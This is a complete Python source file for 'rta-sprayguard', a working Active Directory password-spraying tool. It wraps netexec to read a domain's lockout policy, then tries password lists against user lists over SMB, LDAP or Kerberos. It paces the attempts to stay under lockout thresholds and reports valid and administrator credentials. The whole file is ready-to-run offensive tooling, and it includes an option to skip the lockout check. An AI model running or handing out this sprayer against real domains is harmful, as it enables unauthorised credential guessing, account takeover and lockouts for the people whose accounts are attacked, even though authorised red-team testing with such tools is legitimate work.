#!/usr/bin/env python3
"""rta-sprayguard — Policy-aware AD password sprayer.

Queries the domain password policy FIRST, then sprays within safe bounds.
Automatically respects lockout thresholds, observation windows, and
lockout duration. Supports SMB, LDAP, and Kerberos protocols.

Usage:
  rta-sprayguard -t 192.168.56.10 -d corp.local -U users.txt -P passwords.txt
  rta-sprayguard -t 192.168.56.10 -d corp.local -U users.txt -p 'Spring2024!'
  rta-sprayguard -t 192.168.56.10 -d corp.local -U users.txt -P passwords.txt --proto kerb
  rta-sprayguard policy -t 192.168.56.10 -d corp.local -u jsmith -p 'P@ss'
"""

import argparse
import json
import os
import re
import subprocess
import sys
import time
from datetime import datetime, timedelta


def get_password_policy(target, domain, username, password=None, nthash=None):
    """Query domain password policy via netexec."""
    cmd = ["netexec", "smb", target, "-d", domain, "-u", username]
    if password:
        cmd += ["-p", password]
    elif nthash:
        cmd += ["-H", nthash]
    cmd += ["--pass-pol"]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout
    except Exception as e:
        print(f"  [-] Failed to query policy: {e}")
        return None

    policy = {
        "lockout_threshold": 0,
        "lockout_duration": 30,
        "observation_window": 30,
        "min_password_length": 0,
        "password_history": 0,
        "complexity": False,
    }

    for line in output.split("\n"):
        line_lower = line.lower()
        if "lockout threshold" in line_lower:
            m = re.search(r"(\d+)", line)
            if m:
                policy["lockout_threshold"] = int(m.group(1))
        elif "lockout duration" in line_lower:
            m = re.search(r"(\d+)", line)
            if m:
                policy["lockout_duration"] = int(m.group(1))
        elif "observation window" in line_lower or "reset account lockout" in line_lower:
            m = re.search(r"(\d+)", line)
            if m:
                policy["observation_window"] = int(m.group(1))
        elif "minimum password length" in line_lower:
            m = re.search(r"(\d+)", line)
            if m:
                policy["min_password_length"] = int(m.group(1))
        elif "password history" in line_lower:
            m = re.search(r"(\d+)", line)
            if m:
                policy["password_history"] = int(m.group(1))
        elif "complexity" in line_lower and "true" in line_lower:
            policy["complexity"] = True

    return policy


def spray_round(target, domain, users, password, proto="smb", results=None):
    """Execute a single spray round: one password against all users."""
    if results is None:
        results = {}

    cmd_base = ["netexec", proto, target, "-d", domain]

    for user in users:
        # Skip users we already found valid creds for
        if user in results and results[user].get("valid"):
            continue

        cmd = cmd_base + ["-u", user, "-p", password]
        if proto == "kerb":
            cmd = ["netexec", "smb", target, "-d", domain,
                   "-u", user, "-p", password, "--kerberos"]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            stdout = result.stdout
        except subprocess.TimeoutExpired:
            continue
        except Exception:
            continue

        if user not in results:
            results[user] = {"valid": False, "password": None, "admin": False, "locked": False}

        if "STATUS_ACCOUNT_LOCKED_OUT" in stdout:
            results[user]["locked"] = True
            print(f"  [LOCKED] {domain}\\{user} — STOPPING SPRAY FOR THIS USER")
        elif "[+]" in stdout and "(Pwn3d!)" in stdout:
            results[user]["valid"] = True
            results[user]["password"] = password
            results[user]["admin"] = True
            print(f"  [!!!] {domain}\\{user}:{password} — ADMIN ACCESS")
        elif "[+]" in stdout:
            results[user]["valid"] = True
            results[user]["password"] = password
            print(f"  [+] {domain}\\{user}:{password} — VALID")
        else:
            print(f"  [-] {domain}\\{user}:{password}")

    return results


def main():
    parser = argparse.ArgumentParser(
        description="RTA SprayGuard — policy-aware AD password sprayer",
    )
    sub = parser.add_subparsers(dest="command")

    # spray (default)
    spray = sub.add_parser("spray", help="Execute password spray")
    spray.add_argument("-t", "--target", required=True, help="DC IP")
    spray.add_argument("-d", "--domain", required=True)
    spray.add_argument("-U", "--users", required=True, help="File with usernames")
    spray.add_argument("-P", "--passwords", help="File with passwords")
    spray.add_argument("-p", "--password", help="Single password to spray")
    spray.add_argument("--proto", default="smb", choices=["smb", "ldap", "kerb"])
    spray.add_argument("--auth-user", help="User for policy query (if different)")
    spray.add_argument("--auth-pass", help="Password for policy query")
    spray.add_argument("--force", action="store_true",
                       help="Skip policy check and spray anyway")
    spray.add_argument("--max-attempts", type=int, default=None,
                       help="Override: max attempts before waiting")
    spray.add_argument("-o", "--output", help="Save results to JSON")

    # policy
    pol = sub.add_parser("policy", help="Query password policy only")
    pol.add_argument("-t", "--target", required=True)
    pol.add_argument("-d", "--domain", required=True)
    pol.add_argument("-u", "--username", required=True)
    pol.add_argument("-p", "--password", default=None)
    pol.add_argument("-H", "--hash", default=None)

    args = parser.parse_args()

    if args.command == "policy":
        policy = get_password_policy(args.target, args.domain,
                                      args.username, args.password, args.hash)
        if policy:
            print(f"\n  Password Policy for {args.domain}:")
            print(f"    Lockout Threshold:    {policy['lockout_threshold']} attempts")
            print(f"    Lockout Duration:     {policy['lockout_duration']} minutes")
            print(f"    Observation Window:   {policy['observation_window']} minutes")
            print(f"    Min Password Length:  {policy['min_password_length']}")
            print(f"    Password History:     {policy['password_history']}")
            print(f"    Complexity Required:  {policy['complexity']}")

            if policy["lockout_threshold"] == 0:
                print(f"\n  [!] No lockout policy — unlimited spray is safe")
            else:
                safe = max(1, policy["lockout_threshold"] - 2)
                wait = policy["observation_window"]
                print(f"\n  [*] Safe spray: {safe} attempts per user, "
                      f"then wait {wait} minutes")
        return

    if args.command == "spray" or args.command is None:
        if not hasattr(args, "target") or not args.target:
            parser.print_help()
            return

        # Load users
        with open(args.users) as f:
            users = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        print(f"  [*] Loaded {len(users)} users from {args.users}")

        # Load passwords
        passwords = []
        if args.password:
            passwords = [args.password]
        elif args.passwords:
            with open(args.passwords) as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            print("  [-] Specify -p <password> or -P <password-file>")
            sys.exit(1)
        print(f"  [*] {len(passwords)} password(s) to spray")

        # Query password policy
        policy = None
        if not args.force:
            auth_user = args.auth_user or users[0]
            auth_pass = args.auth_pass
            if auth_pass:
                print(f"  [>] Querying password policy...")
                policy = get_password_policy(args.target, args.domain,
                                              auth_user, auth_pass)

        # Determine safe spray parameters
        if policy and policy["lockout_threshold"] > 0:
            safe_attempts = args.max_attempts or max(1, policy["lockout_threshold"] - 2)
            wait_minutes = policy["observation_window"]
            print(f"\n  [*] Lockout threshold: {policy['lockout_threshold']}")
            print(f"  [*] Safe attempts per window: {safe_attempts}")
            print(f"  [*] Wait between windows: {wait_minutes} minutes")
        elif policy and policy["lockout_threshold"] == 0:
            safe_attempts = len(passwords)  # no lockout
            wait_minutes = 0
            print(f"\n  [!] No lockout policy — spraying all passwords")
        else:
            safe_attempts = args.max_attempts or 2  # conservative default
            wait_minutes = 30
            print(f"\n  [!] Could not query policy — using conservative defaults")
            print(f"  [*] Safe attempts per window: {safe_attempts}")
            print(f"  [*] Wait between windows: {wait_minutes} minutes")

        # Execute spray
        results = {}
        attempt_count = 0

        print(f"\n  {'='*60}")
        print(f"  Starting spray: {len(users)} users × {len(passwords)} passwords")
        print(f"  {'='*60}\n")

        for i, password in enumerate(passwords):
            print(f"\n  ── Round {i+1}/{len(passwords)}: '{password}' ──\n")
            results = spray_round(args.target, args.domain, users, password,
                                   args.proto, results)
            attempt_count += 1

            # Check if we need to wait
            if attempt_count >= safe_attempts and i < len(passwords) - 1:
                if wait_minutes > 0:
                    resume_time = datetime.now() + timedelta(minutes=wait_minutes)
                    print(f"\n  [*] Reached {attempt_count} attempts — waiting {wait_minutes} minutes")
                    print(f"  [*] Resuming at {resume_time.strftime('%H:%M:%S')}")
                    time.sleep(wait_minutes * 60)
                    attempt_count = 0
                    print(f"  [*] Resuming spray...\n")

            # Stop if any accounts got locked
            locked = [u for u, r in results.items() if r.get("locked")]
            if locked:
                print(f"\n  [!!!] {len(locked)} account(s) locked — stopping spray")
                break

        # Summary
        valid = {u: r for u, r in results.items() if r.get("valid")}
        admin = {u: r for u, r in results.items() if r.get("admin")}
        locked = {u: r for u, r in results.items() if r.get("locked")}

        print(f"\n  {'='*60}")
        print(f"  Results:")
        print(f"    Valid credentials: {len(valid)}")
        print(f"    Admin access:     {len(admin)}")
        print(f"    Locked accounts:  {len(locked)}")

        if valid:
            print(f"\n  Valid Credentials:")
            for user, data in valid.items():
                admin_tag = " [ADMIN]" if data.get("admin") else ""
                print(f"    {args.domain}\\{user}:{data['password']}{admin_tag}")

        if args.output:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=2)
            print(f"\n  [+] Results saved to {args.output}")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
